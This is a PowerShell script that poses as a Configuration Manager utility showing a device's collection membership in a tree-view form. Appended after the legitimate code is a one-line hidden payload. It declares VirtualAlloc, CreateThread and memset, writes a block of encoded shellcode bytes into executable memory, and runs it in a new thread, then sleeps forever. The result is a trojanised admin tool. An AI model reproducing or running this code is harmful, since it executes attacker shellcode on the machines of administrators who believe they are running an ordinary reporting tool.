[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$false, HelpMessage="Site server where the SMS Provider is installed")]
    [string]$SiteServer = "CAS01",
    [parameter(Mandatory=$false, HelpMessage="ResourceID of the device")]
    [string]$ResourceID = "16777224"
)
Begin {
    
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
            }
        }
    }
    catch [Exception] {
        Throw "Unable to determine SiteCode"
    }

    
    
    $IconExtractor = @"
    using System;
    using System.Drawing;
    using System.Runtime.InteropServices;

    namespace System {
	    public class IconExtractor {
            public static Icon Extract(string file, int number, bool largeIcon) {
                IntPtr large;
	            IntPtr small;
	            ExtractIconEx(file, number, out large, out small, 1);
	            try {
	                return Icon.FromHandle(largeIcon ? large : small);
	            }
	            catch {
	                return null;
	            }
            }
	        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
	        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);
	    }
    }
"@ 

    
    Add-Type -AssemblyName "System.Drawing"
    Add-Type -AssemblyName "System.Windows.Forms"
    Add-Type -TypeDefinition $IconExtractor -ReferencedAssemblies "System.Drawing"
}
Process {
    
    function Load-Form {
        $Form.Controls.AddRange(@(
            $TreeView,
            $GroupBox
        ))
	    $Form.Add_Shown({
            Build-TreeView -ResourceID $ResourceID
            $Form.Activate()
        })
	    [void]$Form.ShowDialog()
    }

    function Get-CollectionName {
        param(
            [parameter(Mandatory=$true)]
            [string]$CollectionID
        )
        $Collection = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_Collection -ComputerName $SiteServer -Filter "CollectionID like '$($CollectionID)'"
        if ($Collection -ne $null) {
            return $Collection.Name
        }
    }

    function Set-NodeCollection {
        param(
            [parameter(Mandatory=$true)]
            [int]$ContainerNodeID,
            [parameter(Mandatory=$true)]
            $Node
        )
        $NodeCollections = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_ObjectContainerItem -ComputerName $SiteServer -Filter "ContainerNodeID = $($ContainerNodeID) AND ObjectType = 5000"
        foreach ($NodeCollection in $NodeCollections) {
            if ($NodeCollection.InstanceKey -in $DeviceCollectionIDs) {
                $CollectionName = Get-CollectionName -CollectionID $NodeCollection.InstanceKey
                $CollNode = $Node.Nodes.Add($CollectionName)
                $CollNode.ImageIndex = 2
                $CollNode.Expand()
                $Script:ExpandNode = $true
                
            }
        }
    }

    function Expand-TreeNode {
        param(
            [parameter(Mandatory=$true)]
            $ParentNode
        )
        do {
            $Node = $ParentNode.Parent.Expand()
            Expand-TreeNode -ParentNode $Node
        }
        until ($Node.Parent -eq $null)
    }

    function Get-SubNode {
        param(
            [parameter(Mandatory=$true)]
            [int]$ParentContainerNodeID,
            [parameter(Mandatory=$true)]
            $ParentNode
        )
        $SubNodes = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_ObjectContainerNode -ComputerName $SiteServer -Filter "ParentContainerNodeID = $($ParentContainerNodeID) AND ObjectType = 5000"
        if ($SubNodes -ne $null) {
            foreach ($SubNode in ($SubNodes | Sort-Object -Property Name)) {
                $Script:ExpandNode = $false
                $Node = $ParentNode.Nodes.Add($SubNode.Name)
                $Node.ImageIndex = 1
                Get-SubNode -ParentContainerNodeID $SubNode.ContainerNodeID -ParentNode $Node
                Set-NodeCollection -ContainerNodeID $SubNode.ContainerNodeID -Node $Node
                if ($Script:ExpandNode -eq $true) {
                    $Node.Expand()
                }
            }
        }
    }

    function Build-TreeView {
        param(
            [parameter(Mandatory=$true)]
            $ResourceID
        )
        
        $TreeView.Nodes.Clear()
        
        $RootNode = $TreeView.Nodes.Add("Root")
        $RootNode.ImageIndex = 1
        
        $DeviceCollectionIDs = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_FullCollectionMembership -ComputerName $SiteServer -Filter "ResourceID like '$($ResourceID)'" | Select-Object -ExpandProperty CollectionID
        
        $RootNodes = Get-WmiObject -Namespace "root\SMS\Site_$($SiteCode)" -Class SMS_ObjectContainerNode -ComputerName $SiteServer -Filter "ParentContainerNodeID = 0 AND ObjectType = 5000"
        foreach ($Node in ($RootNodes | Sort-Object -Property Name)) {
            $CurrentNode = $RootNode.Nodes.Add($Node.Name)
            $CurrentNode.ImageIndex = 1
            Set-NodeCollection -ContainerNodeID $Node.ContainerNodeID -Node $CurrentNode
            Get-SubNode -ParentContainerNodeID $Node.ContainerNodeID -ParentNode $CurrentNode
        }
        $RootNode.Expand()
        
    }

    
    $Script:ExpandNode = $false

    
    $BinaryFormatter = New-Object -TypeName System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
	$MemoryStream = New-Object -TypeName System.IO.MemoryStream (,[byte[]][System.Convert]::FromBase64String(
        'AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAu
        MC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAA
        ACZTeXN0ZW0uV2luZG93cy5Gb3Jtcy5JbWFnZUxpc3RTdHJlYW1lcgEAAAAERGF0YQcCAgAAAAkD
        AAAADwMAAABwCgAAAk1TRnQBSQFMAgEBBAEAAUABAAFAAQABEAEAARABAAT/AQkBAAj/AUIBTQE2
        AQQGAAE2AQQCAAEoAwABQAMAASADAAEBAQABCAYAAQgYAAGAAgABgAMAAoABAAGAAwABgAEAAYAB
        AAKAAgADwAEAAcAB3AHAAQAB8AHKAaYBAAEzBQABMwEAATMBAAEzAQACMwIAAxYBAAMcAQADIgEA
        AykBAANVAQADTQEAA0IBAAM5AQABgAF8Af8BAAJQAf8BAAGTAQAB1gEAAf8B7AHMAQABxgHWAe8B
        AAHWAucBAAGQAakBrQIAAf8BMwMAAWYDAAGZAwABzAIAATMDAAIzAgABMwFmAgABMwGZAgABMwHM
        AgABMwH/AgABZgMAAWYBMwIAAmYCAAFmAZkCAAFmAcwCAAFmAf8CAAGZAwABmQEzAgABmQFmAgAC
        mQIAAZkBzAIAAZkB/wIAAcwDAAHMATMCAAHMAWYCAAHMAZkCAALMAgABzAH/AgAB/wFmAgAB/wGZ
        AgAB/wHMAQABMwH/AgAB/wEAATMBAAEzAQABZgEAATMBAAGZAQABMwEAAcwBAAEzAQAB/wEAAf8B
        MwIAAzMBAAIzAWYBAAIzAZkBAAIzAcwBAAIzAf8BAAEzAWYCAAEzAWYBMwEAATMCZgEAATMBZgGZ
        AQABMwFmAcwBAAEzAWYB/wEAATMBmQIAATMBmQEzAQABMwGZAWYBAAEzApkBAAEzAZkBzAEAATMB
        mQH/AQABMwHMAgABMwHMATMBAAEzAcwBZgEAATMBzAGZAQABMwLMAQABMwHMAf8BAAEzAf8BMwEA
        ATMB/wFmAQABMwH/AZkBAAEzAf8BzAEAATMC/wEAAWYDAAFmAQABMwEAAWYBAAFmAQABZgEAAZkB
        AAFmAQABzAEAAWYBAAH/AQABZgEzAgABZgIzAQABZgEzAWYBAAFmATMBmQEAAWYBMwHMAQABZgEz
        Af8BAAJmAgACZgEzAQADZgEAAmYBmQEAAmYBzAEAAWYBmQIAAWYBmQEzAQABZgGZAWYBAAFmApkB
        AAFmAZkBzAEAAWYBmQH/AQABZgHMAgABZgHMATMBAAFmAcwBmQEAAWYCzAEAAWYBzAH/AQABZgH/
        AgABZgH/ATMBAAFmAf8BmQEAAWYB/wHMAQABzAEAAf8BAAH/AQABzAEAApkCAAGZATMBmQEAAZkB
        AAGZAQABmQEAAcwBAAGZAwABmQIzAQABmQEAAWYBAAGZATMBzAEAAZkBAAH/AQABmQFmAgABmQFm
        ATMBAAGZATMBZgEAAZkBZgGZAQABmQFmAcwBAAGZATMB/wEAApkBMwEAApkBZgEAA5kBAAKZAcwB
        AAKZAf8BAAGZAcwCAAGZAcwBMwEAAWYBzAFmAQABmQHMAZkBAAGZAswBAAGZAcwB/wEAAZkB/wIA
        AZkB/wEzAQABmQHMAWYBAAGZAf8BmQEAAZkB/wHMAQABmQL/AQABzAMAAZkBAAEzAQABzAEAAWYB
        AAHMAQABmQEAAcwBAAHMAQABmQEzAgABzAIzAQABzAEzAWYBAAHMATMBmQEAAcwBMwHMAQABzAEz
        Af8BAAHMAWYCAAHMAWYBMwEAAZkCZgEAAcwBZgGZAQABzAFmAcwBAAGZAWYB/wEAAcwBmQIAAcwB
        mQEzAQABzAGZAWYBAAHMApkBAAHMAZkBzAEAAcwBmQH/AQACzAIAAswBMwEAAswBZgEAAswBmQEA
        A8wBAALMAf8BAAHMAf8CAAHMAf8BMwEAAZkB/wFmAQABzAH/AZkBAAHMAf8BzAEAAcwC/wEAAcwB
        AAEzAQAB/wEAAWYBAAH/AQABmQEAAcwBMwIAAf8CMwEAAf8BMwFmAQAB/wEzAZkBAAH/ATMBzAEA
        Af8BMwH/AQAB/wFmAgAB/wFmATMBAAHMAmYBAAH/AWYBmQEAAf8BZgHMAQABzAFmAf8BAAH/AZkC
        AAH/AZkBMwEAAf8BmQFmAQAB/wKZAQAB/wGZAcwBAAH/AZkB/wEAAf8BzAIAAf8BzAEzAQAB/wHM
        AWYBAAH/AcwBmQEAAf8CzAEAAf8BzAH/AQAC/wEzAQABzAH/AWYBAAL/AZkBAAL/AcwBAAJmAf8B
        AAFmAf8BZgEAAWYC/wEAAf8CZgEAAf8BZgH/AQAC/wFmAQABIQEAAaUBAANfAQADdwEAA4YBAAOW
        AQADywEAA7IBAAPXAQAD3QEAA+MBAAPqAQAD8QEAA/gBAAHwAfsB/wEAAaQCoAEAA4ADAAH/AgAB
        /wMAAv8BAAH/AwAB/wEAAf8BAAL/AgAD//8A/wD/AP8ABQAk/wL0Bv8D9AP/DPQD/wp0BHMC/wp0
        BHMC/wPsAesBbQH3Av8BBwLsAesBcgFtAfQC/wwqA/8BdAGaA3kBegd5AXMC/wF0AZoDeQF6B3kB
        cwL/AfcBBwGYATQBVgH3Av8BvAHvAQcBVgE5AXIB9AL/AVEBHAF0A3MFUQEqA/8BeQKaBUsFmgF0
        Av8BeQyaAXQC/wHvAQcB7wJ4AZIC8QMHAXgBWAHrAfQC/wF0ApkCeQN0A1IBKgP/AXkCmgFLA1EB
        KgWaAXQC/wF5DJoBdAL/Ae8CBwHvAZIC7AFyAe0CBwLvAewB9AL/AZkCGgGgBJoCegF5AVID/wF5
        AaABmgF5AZkCeQFRBZoBdAL/AXkBoAuaAXQC/wEHAe8C9wLtAXgBNQF4Ae8D9wHsAfQC/wGZAhoB
        oASaAnoBeQFSA/8BeQGgAZoCmQGgAXkBUgWaAXQC/wF5AaALmgF0Av8BBwPvAfcB7QGYAXgBmQEH
        A+8B7AP/AZkCGgGgBJoCegF5AVID/wGZAaABmgGZAXkBmgF5AVIFmgF0Av8BmQGgC5oBdAL/AbwD
        8wG8AZIBBwHvAQcB8QLzAfIB7QP/AZkCGgGgBJoCegF5AVID/wGZAaABmgJ5AXQCUgWaAXQC/wGZ
        AaALmgF0Av8BvAEHAu8B9wPtAe8CBwLvAe0D/wGZARoBmgKZBnkBUgP/AZkBwwGaBHQBeQGgBJoB
        dAL/AZkBwwaaAaAEmgF0Av8CvAIHAvcCBwO8AgcBkgP/AZkBGgGZAxoDmgFSAXkBUgP/AZkBwwOa
        AqABmQWaAXQC/wGZAcMDmgKgAZkFmgF0Av8CvAHrAewCBwLzAfABvAHtAW0BBwH3A/8BmQEaAZkC
        9gTDAVIBeQFSA/8BmQWgAZoCdAV5Av8BmQWgAZoCdAV5Av8BvAEHApIB7wH3ApIB7wG8Ae8BkgHv
        AfcD/wGZAhoC9gTDAVgBeQFSA/8BmQGaBBoBdAOaApkBmgF5Av8BeQGaBBoBdAOaApkBmgF5Av8D
        9AHyAbwB8QK8Ae8B8AT0A/8BmQMaApkDeQFYAXkBUgP/ARsGeQGaAvYB1gG0AZoBmQL/AZkGeQGa
        AvYB1gG0AZoBeQX/AfQBvAH3ARIB7AHvAfAH/wFRARwBeQN0AVIEUQEqCf8BwwZ5AcMI/wGaBnkB
        mgX/AfQBvAEHAu8B9wHxB/8MUUL/AUIBTQE+BwABPgMAASgDAAFAAwABIAMAAQEBAAEBBgABARYA
        A///AAIACw=='
    ))

    
    $Form = New-Object -TypeName System.Windows.Forms.Form    
    $Form.Size = New-Object -TypeName System.Drawing.Size(350,450)  
    $Form.MinimumSize = New-Object -TypeName System.Drawing.Size(350,450)
    $Form.MaximumSize = New-Object -TypeName System.Drawing.Size([System.Int32]::MaxValue,[System.Int32]::MaxValue)
    $Form.SizeGripStyle = "Show"
    $Form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($PSHome + "\powershell.exe")
    $Form.Text = "Collection Membership"
    $Form.ControlBox = $true
    $Form.TopMost = $true

    
    $ImageList = New-Object -TypeName System.Windows.Forms.ImageList
    $ImageList.ImageStream = $BinaryFormatter.Deserialize($MemoryStream)
    $ImageList.Images
	$BinaryFomatter = $null
	$MemoryStream = $null

    
    $TreeView = New-Object -TypeName System.Windows.Forms.TreeView
    $TreeView.Location = New-Object -TypeName System.Drawing.Size(20,25)
    $TreeView.Size = New-Object -TypeName System.Drawing.Size(290,355)
    $TreeView.Anchor = "Top, Left, Bottom, Right"
    $TreeView.ImageList = $ImageList

    $GroupBox = New-Object -TypeName System.Windows.Forms.GroupBox
    $GroupBox.Location = New-Object -TypeName System.Drawing.Size(10,5)
    $GroupBox.Size = New-Object -TypeName System.Drawing.Size(310,385)
    $GroupBox.Anchor = "Top, Left, Bottom, Right"
    $GroupBox.Text = "Collections"

    
    Load-Form
}
$Gi2N = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Gi2N -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd0,0xd9,0x74,0x24,0xf4,0x5f,0xb8,0xe6,0x77,0x41,0xbc,0x31,0xc9,0xb1,0x58,0x31,0x47,0x1a,0x03,0x47,0x1a,0x83,0xc7,0x04,0xe2,0x13,0x8b,0xa9,0x3e,0xdb,0x74,0x2a,0x5f,0x52,0x91,0x1b,0x5f,0x00,0xd1,0x0c,0x6f,0x43,0xb7,0xa0,0x04,0x01,0x2c,0x32,0x68,0x8d,0x43,0xf3,0xc7,0xeb,0x6a,0x04,0x7b,0xcf,0xed,0x86,0x86,0x03,0xce,0xb7,0x48,0x56,0x0f,0xff,0xb5,0x9a,0x5d,0xa8,0xb2,0x08,0x72,0xdd,0x8f,0x90,0xf9,0xad,0x1e,0x90,0x1e,0x65,0x20,0xb1,0xb0,0xfd,0x7b,0x11,0x32,0xd1,0xf7,0x18,0x2c,0x36,0x3d,0xd3,0xc7,0x8c,0xc9,0xe2,0x01,0xdd,0x32,0x48,0x6c,0xd1,0xc0,0x91,0xa8,0xd6,0x3a,0xe4,0xc0,0x24,0xc6,0xfe,0x16,0x56,0x1c,0x8b,0x8c,0xf0,0xd7,0x2b,0x69,0x00,0x3b,0xad,0xfa,0x0e,0xf0,0xba,0xa5,0x12,0x07,0x6f,0xde,0x2f,0x8c,0x8e,0x31,0xa6,0xd6,0xb4,0x95,0xe2,0x8d,0xd5,0x8c,0x4e,0x63,0xea,0xcf,0x30,0xdc,0x4e,0x9b,0xdd,0x09,0xe3,0xc6,0x89,0xa3,0x9e,0x8c,0x49,0x54,0x17,0x04,0x24,0xcd,0x83,0xbe,0xf4,0x7a,0x0d,0x38,0xfa,0x50,0x60,0x9d,0x57,0x08,0xd1,0x72,0x0b,0xc6,0xef,0x22,0xd2,0xb1,0xf0,0x1e,0x77,0xed,0x64,0xa2,0x2b,0x42,0x10,0xff,0xda,0x64,0xe0,0x17,0x50,0x64,0xe0,0xe7,0x46,0x0c,0xa6,0xd7,0xad,0x86,0x26,0x48,0xa6,0x41,0xaf,0xf7,0xf0,0x91,0x7a,0x8e,0x3b,0x3e,0xec,0x91,0xf1,0x21,0x68,0xc2,0xa6,0xf2,0x27,0xb6,0x1e,0x9d,0x2c,0x6d,0xb1,0x66,0x4d,0x5b,0x5b,0xf2,0xbb,0x3b,0x0c,0x83,0x88,0xc3,0xcc,0x0a,0x0e,0xa9,0xc8,0x5c,0xa4,0x31,0x87,0x34,0x4d,0x08,0xb9,0x43,0x52,0x41,0x96,0x18,0xff,0x39,0x4f,0xf7,0xd2,0xbb,0x77,0x7c,0xd3,0x11,0x02,0x42,0x5e,0x90,0x42,0x36,0x79,0xcc,0xac,0x0d,0xdb,0x5b,0xb2,0xbb,0x71,0x24,0x24,0x44,0x95,0xa4,0xb4,0x2c,0x95,0xa4,0xf4,0xac,0xc6,0xcc,0xac,0x08,0xbb,0xe9,0xb2,0x84,0xa8,0xa1,0x1f,0xae,0x29,0x12,0xc8,0xb0,0x95,0x9d,0x08,0xe2,0x83,0xf5,0x1a,0x92,0xa2,0xe4,0xe4,0x4f,0x31,0x28,0x6e,0xbd,0xb2,0xae,0x8e,0xfe,0x41,0x70,0xe5,0xe5,0x11,0xb2,0x59,0x0e,0xd4,0xcb,0x99,0x31,0x61,0x43,0x11,0xfd,0xa3,0xc8,0xb5,0x73,0xd4,0x63,0x23,0x59,0x5f,0x0c,0x85,0xc5,0xfe,0x98,0xbc,0x05;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$G2qN=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($G2qN.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$G2qN,0,0,0);for (;;){Start-sleep 60};

